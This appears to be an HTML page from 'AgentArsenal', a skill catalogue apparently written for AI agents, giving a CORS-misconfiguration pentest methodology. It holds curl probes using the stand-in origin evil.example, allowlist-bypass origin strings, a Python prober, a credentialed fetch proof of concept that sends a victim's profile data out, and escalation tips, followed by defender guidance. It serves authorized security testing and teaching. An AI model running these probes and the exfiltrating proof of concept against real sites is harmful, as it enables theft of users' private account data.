@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: cors-misconfig</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>cors-misconfig</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing cross-origin resource sharing (CORS)</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a> <a href="auth-attacks.html">auth-attacks</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>CORS is a browser mechanism that lets a server declare which origins may read its responses cross-origin. When the configuration is sloppy, any website the victim visits can read responses that carry the victim&#x27;s cookies, which turns a configuration detail into full account compromise. This skill covers the authorized methodology: probing ACAO behavior with crafted Origin headers, testing credentialed CORS, bypassing allowlists, abusing preflight, and proving impact with a working HTML proof of concept. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map the API surface: every endpoint that returns</li>
+<p><code>Access-Control-Allow-Origin</code>, especially ones handling sessions, profile data, or tokens.</p>
+<li>Send a request with <code>Origin: https://evil.example</code> and check whether</li>
+<p>the origin is reflected in the response.</p>
+<li>Repeat with cookies attached and look for</li>
+<p><code>Access-Control-Allow-Credentials: true</code> next to a reflected origin.</p>
+<li>Test trust of the <code>null</code> origin and of attacker-controlled subdomains.</li>
+<li>Probe preflight: send OPTIONS with <code>Access-Control-Request-Method</code> and</li>
+<p>read which methods and headers the server allows.</p>
+<li>Build a local HTML proof of concept that fetches a sensitive endpoint</li>
+<p>with credentials and exfiltrates the response.</p>
+<li>Check caching interactions: a poisoned or cached ACAO response widens</li>
+<p>the impact.</p>
+<li>Record the exact request, response headers, and PoC result for the</li>
+<p>report.</p>
+</ol>
+<h2>1. Probing Access-Control-Allow-Origin reflection</h2>
+<p>Start with simple GET requests carrying different Origin values. The vulnerable pattern is the server echoing back whatever origin it receives.</p>
+<pre><code class="language-bash"># Evil origin probe: look for ACAO: https://evil.example in the reply
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://evil.example&#x27; | grep -i &#x27;access-control&#x27;
+
+# Legitimate origin baseline for comparison
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://target.example&#x27; | grep -i &#x27;access-control&#x27;
+
+# No Origin header: CORS headers should be absent here
+curl -si &#x27;https://target.example/api/profile&#x27; | grep -i &#x27;access-control&#x27;</code></pre>
+<pre><code class="language-bash"># Batch probe many endpoints for reflection with one loop
+for p in /api/profile /api/orders /api/tokens /api/settings; do
+  echo &quot;== $p ==&quot;
+  curl -s -o /dev/null -D - &quot;https://target.example$p&quot; \
+    -H &#x27;Origin: https://evil.example&#x27; | grep -i &#x27;access-control-allow-origin&#x27;
+done</code></pre>
+<p>Reflection alone is low impact without credentials. The dangerous combination is a reflected origin plus <code>Access-Control-Allow-Credentials: true</code>, because then the attacker&#x27;s page can read responses made with the victim&#x27;s cookies.</p>
+<h2>2. Credentialed CORS testing</h2>
+<p>Repeat the probes with the session cookie attached, exactly as the victim&#x27;s browser would send them.</p>
+<pre><code class="language-bash"># Credentialed request from an evil origin
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -b &#x27;session=YOUR_TEST_SESSION&#x27; \
+  -H &#x27;Origin: https://evil.example&#x27; | grep -i &#x27;access-control&#x27;</code></pre>
+<p>What to look for in the response:</p>
+<ul>
+<li><code>Access-Control-Allow-Origin: https://evil.example</code> (reflected, not <code>*</code>)</li>
+<li><code>Access-Control-Allow-Credentials: true</code></li>
+</ul>
+<p>Both together mean a malicious page can run <code>fetch(url, {credentials: &quot;include&quot;})</code> and read the victim&#x27;s private API data. Note that <code>Access-Control-Allow-Origin: *</code> cannot be combined with credentials by spec, so a wildcard alone is usually not exploitable for cookie-based sessions, though it still leaks data for token-less APIs.</p>
+<h2>3. Null origin and subdomain trust</h2>
+<p>Some servers allowlist the literal string <code>null</code>, which browsers send from sandboxed iframes, and some trust any subdomain of the target.</p>
+<pre><code class="language-bash"># Null origin probe (proxied through Burp or curl)
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: null&#x27; | grep -i &#x27;access-control&#x27;
+
+# Attacker subdomain of the target (register evil.target.example in a lab,
+# or simulate with /etc/hosts pointing at your test server)
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://evil.target.example&#x27; | grep -i &#x27;access-control&#x27;</code></pre>
+<p>If <code>null</code> is trusted, the PoC uses a sandboxed iframe to generate the null origin. If subdomains are trusted, any subdomain takeover or any XSS on any subdomain becomes full CORS bypass, so note the blast radius.</p>
+<h2>4. Allowlist bypass techniques</h2>
+<p>When the server validates against an allowlist, test the validation logic itself. These bypasses work against string-prefix, suffix, and regex checks seen in real applications.</p>
+<pre><code class="language-bash"># Suffix check bypass: endswith(&quot;target.example&quot;)
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://target.example.evil.example&#x27; | grep -i &#x27;access-control&#x27;
+
+# Prefix check bypass: startswith(&quot;https://target.example&quot;)
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://target.exampleevil.example&#x27; | grep -i &#x27;access-control&#x27;
+
+# Dot trick: some parsers treat a trailing dot as the same host
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://target.example.&#x27; | grep -i &#x27;access-control&#x27;
+
+# Scheme confusion
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: http://target.example&#x27; | grep -i &#x27;access-control&#x27;</code></pre>
+<p>A Python loop makes this systematic across a bypass wordlist:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;CORS allowlist bypass prober (authorized targets only).&quot;&quot;&quot;
+import urllib.request
+
+TARGET = &quot;https://target.example/api/profile&quot;
+ORIGINS = [
+    &quot;https://evil.example&quot;,
+    &quot;https://target.example.evil.example&quot;,
+    &quot;https://target.exampleevil.example&quot;,
+    &quot;https://target.example.&quot;,
+    &quot;http://target.example&quot;,
+    &quot;null&quot;,
+    &quot;https://sub.target.example&quot;,
+]
+for origin in ORIGINS:
+    req = urllib.request.Request(TARGET, headers={&quot;Origin&quot;: origin})
+    with urllib.request.urlopen(req, timeout=10) as r:
+        acao = r.headers.get(&quot;Access-Control-Allow-Origin&quot;)
+        acac = r.headers.get(&quot;Access-Control-Allow-Credentials&quot;)
+    print(f&quot;{origin:45} ACAO={acao} ACAC={acac}&quot;)</code></pre>
+<h2>5. Preflight (OPTIONS) abuse</h2>
+<p>Browsers send a preflight OPTIONS request before cross-origin calls with non-simple methods or headers. A permissive preflight lets the attacker&#x27;s page use PUT, DELETE, or custom headers cross-origin.</p>
+<pre><code class="language-bash"># Preflight probe: ask whether PUT with a custom header is allowed
+curl -si -X OPTIONS &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://evil.example&#x27; \
+  -H &#x27;Access-Control-Request-Method: PUT&#x27; \
+  -H &#x27;Access-Control-Request-Headers: X-Custom-Token&#x27; \
+  | grep -i &#x27;access-control&#x27;</code></pre>
+<p>Read the response for:</p>
+<ul>
+<li><code>Access-Control-Allow-Methods</code> listing PUT, DELETE, or PATCH for the</li>
+<p>evil origin.</p>
+<li><code>Access-Control-Allow-Headers</code> echoing the requested custom header.</li>
+<li><code>Access-Control-Max-Age</code> with a large value, which caches the</li>
+<p>permission in the victim&#x27;s browser and makes the attack reliable.</p>
+</ul>
+<p>If preflight allows state-changing methods cross-origin with credentials, the attacker page can both read and write as the victim.</p>
+<h2>6. Building the proof of concept</h2>
+<p>Host this page locally during the test (never on a public domain). Open it in a browser logged in to the target as the test victim.</p>
+<pre><code class="language-html">&lt;!-- cors-poc.html: serve from http://127.0.0.1:8000 --&gt;
+&lt;script&gt;
+  fetch(&quot;https://target.example/api/profile&quot;, { credentials: &quot;include&quot; })
+    .then(r =&gt; r.text())
+    .then(data =&gt; {
+      document.body.innerText = &quot;STOLEN:\n&quot; + data;
+      // Exfiltrate to the local test server log
+      fetch(&quot;http://127.0.0.1:8000/log?d=&quot; + encodeURIComponent(data));
+    })
+    .catch(e =&gt; document.body.innerText = &quot;FAILED: &quot; + e);
+&lt;/script&gt;</code></pre>
+<pre><code class="language-bash">cd /tmp &amp;&amp; python3 -m http.server 8000
+# Open http://127.0.0.1:8000/cors-poc.html in the victim-test browser</code></pre>
+<p>Variants for special cases:</p>
+<ul>
+<li>Null origin trusted: wrap the fetch in `&lt;iframe sandbox=&quot;allow-scripts&quot;</li>
+<p>srcdoc=&quot;...&quot;&gt;<code> so the browser sends </code>Origin: null`.</p>
+<li>Preflight needed: use <code>method: &quot;PUT&quot;</code> and the custom header in the</li>
+<p>fetch so the browser performs the real preflight flow.</p>
+</ul>
+<p>A screenshot of the victim&#x27;s private data rendered on the attacker&#x27;s origin is the strongest possible evidence for the report.</p>
+<h2>7. Caching and Vary interactions</h2>
+<p>Check whether CORS responses are cached, because a cached permissive response can affect other users, and a missing <code>Vary: Origin</code> can leak one user&#x27;s CORS grant to another origin.</p>
+<pre><code class="language-bash"># Is the ACAO response cached? Look for Age, X-Cache, or CF-Cache-Status
+curl -si &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://evil.example&#x27; | grep -iE &#x27;^(age|x-cache|cf-cache|vary):&#x27;
+
+# Two origins, same URL: does the second get the first origin&#x27;s ACAO?
+curl -s -D - -o /dev/null &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://evil.example&#x27; | grep -i &#x27;access-control-allow-origin&#x27;
+curl -s -D - -o /dev/null &#x27;https://target.example/api/profile&#x27; \
+  -H &#x27;Origin: https://other.example&#x27; | grep -i &#x27;access-control-allow-origin&#x27;</code></pre>
+<p>If the cache serves the evil origin&#x27;s ACAO to other origins, or omits <code>Vary: Origin</code> while varying the header per origin, flag it: the cache layer is amplifying the misconfiguration.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The API uses bearer tokens instead of cookies: wildcard ACAO plus a</li>
+<p>token the attacker already has (for example from another leak) still matters, but credentialed-CORS theft does not apply.</p>
+<li><code>Access-Control-Allow-Origin: *</code> with <code>Vary: Origin</code> absent: fine for</li>
+<p>public data, a finding only if the endpoint returns private data.</p>
+<li>Internal origins allowlisted (intranet hosts, localhost): reachable</li>
+<p>only from the victim&#x27;s network, so impact depends on the engagement scenario; document it rather than dismissing it.</p>
+<li>Mobile apps and non-browser clients ignore CORS entirely: the finding</li>
+<p>is browser-specific, say so in the report.</p>
+<li>The server reflects the origin only on 200 responses but not on</li>
+<p>errors: test both, because error paths sometimes leak stack traces worth reading cross-origin.</p>
+<li>Regex allowlists that permit any subdomain: any stored XSS on any</li>
+<p>subdomain, or any subdomain takeover, upgrades this to full bypass.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Reflected origin without credentials: pivot to endpoints that accept</li>
+<p>tokens in the URL or body, which the attacker&#x27;s page can supply itself, or to preflight abuse for cross-origin writes.</p>
+<li><code>null</code> origin not trusted directly: chain with an open redirect that</li>
+<p>lands on a <code>data:</code> URL or sandboxed iframe to manufacture a null origin in the victim&#x27;s browser.</p>
+<li>Subdomain allowlist: hunt that subdomain for XSS or takeover to turn</li>
+<p>a partial trust into full origin control.</p>
+<li>Preflight allows <code>X-Requested-With</code> or custom auth headers: the</li>
+<p>attacker&#x27;s page can now send the exact headers the API expects, bypassing naive header-based CSRF defenses.</p>
+<li>Cached ACAO: combine with cache poisoning techniques to serve the</li>
+<p>permissive headers to victims who never made the evil-origin request.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see CORS abuse as API requests carrying unexpected <code>Origin</code> values that still receive 200 responses with reflected ACAO headers, and as OPTIONS preflight bursts from origins that were never allowlisted. Application logs showing private data served to odd origins are the smoking gun. The durable fixes are an explicit allowlist of trusted origins (never reflect arbitrary origins), only setting <code>Access-Control-Allow-Credentials: true</code> for origins that truly need it, keeping preflight allow-methods and allow-headers minimal, and adding <code>Vary: Origin</code> whenever the response varies by origin. A WAF cannot fix logic-level origin trust, so this is a code configuration issue.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry</li>
+<p>point class.</p>
+<li>CWE-942 (Permissive Cross-domain Policy with Untrusted Domains).</li>
+<li>CWE-346 (Origin Validation Error).</li>
+<li>OWASP HTML5 Security Cheat Sheet and CORS guidance: allowlist origins,</li>
+<p>avoid reflecting Origin with credentials.</p>
+<li>PortSwigger Web Security Academy: CORS labs covering reflection,</li>
+<p>null origin, and allowlist bypasses.</p>
+<li>Fetch Standard (https://fetch.spec.whatwg.org/): the normative CORS</li>
+<p>protocol browsers implement.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
